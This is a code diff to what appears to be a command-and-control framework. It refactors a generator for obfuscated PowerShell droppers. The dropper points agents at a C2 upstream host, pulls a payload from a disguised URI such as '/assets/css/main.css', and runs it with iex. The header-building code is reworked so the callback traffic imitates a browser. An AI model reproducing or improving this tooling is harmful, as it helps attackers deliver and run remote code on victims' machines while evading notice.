@@ -164,33 +164,31 @@ iex ${{VAR_CONTENT}}
         
         return '\n'.join(formatted_lines)
     
-    def generate_dropper(self, server_ip):
+    def generate_dropper(self, listener_config):
+        """Generate an obfuscated PowerShell dropper for the given listener.
+
+        listener_config must have:
+          - bind_port (int)
+          - protocol  (str)  e.g. 'http' / 'https'
+          - upstream_host (str)  the C2 host agents connect to (also used as Host header)
+          - profile   (dict) with 'http' sub-dict
+        """
         try:
-            if not server_ip or not server_ip.strip():
-                error_msg = "IP/host of the server is required"
-                print(f"\033[91m[ERROR]\033[0m DROPPER GENERATOR - {error_msg}")
-                self.logger.log_event(f"ERR DROPPER GENERATOR - {error_msg}")
-                return None
-            
-            server_ip = server_ip.strip()
-            profile = self.config_loader.get_agent_profile_config()
-            bind_config = profile.get('bind', {})
-            protocol = bind_config.get('protocol', 'http')
-            port = bind_config.get('port', 443 if protocol == 'https' else 80)
+            main_host = listener_config.get('upstream_host') or 'localhost'
+            profile = listener_config['profile']
+            protocol = listener_config.get('protocol', 'http')
+            port = listener_config.get('bind_port', 443 if protocol == 'https' else 80)
 
             http_config = profile.get('http', {})
             user_agent = http_config.get('user_agent', 'Mozilla/5.0')
             uris = http_config.get('uris', [])
             request_headers = http_config.get('request_headers', [])
 
-            upstream_config = profile.get('upstream', {})
-            hosts = upstream_config.get('hosts', [])
-
             delivery_uri = uris[1] if len(uris) >= 2 else "/assets/css/main.css"
-            main_host = hosts[0] if hosts else "localhost"
 
+            external_host = listener_config.get('external_host') or main_host
             default_port = 443 if protocol == 'https' else 80
-            agent_url = server_ip if port == default_port else f"{server_ip}:{port}"
+            agent_url = external_host if port == default_port else f"{external_host}:{port}"
             
             obfuscation_map = self._generate_obfuscation_map()
             
@@ -249,20 +247,22 @@ iex ${{VAR_CONTENT}}
     def _build_dropper_headers(self, request_headers, main_host, user_agent, obfuscation_map):
         try:
             headers_var = obfuscation_map.get('headers', 'headers')
-            
+
             headers_dict = {
                 "Host": main_host,
                 "User-Agent": f'"{user_agent}"',
-                "Accept": '"*/*"'
             }
-            
+
             for header_line in request_headers:
                 if ':' in header_line:
                     key, value = header_line.split(':', 1)
                     key = key.strip()
                     value = value.strip().strip('"')
-                    if key.lower() not in ['host', 'user-agent', 'accept']:
+                    if key.lower() not in ('host', 'user-agent'):
                         headers_dict[key] = f'"{value}"'
+
+            if not any(k.lower() == 'accept' for k in headers_dict):
+                headers_dict['Accept'] = '"*/*"'
             
             ps_headers = f'${headers_var} = @{{\n'
             max_key_length = max(len(key) for key in headers_dict.keys())
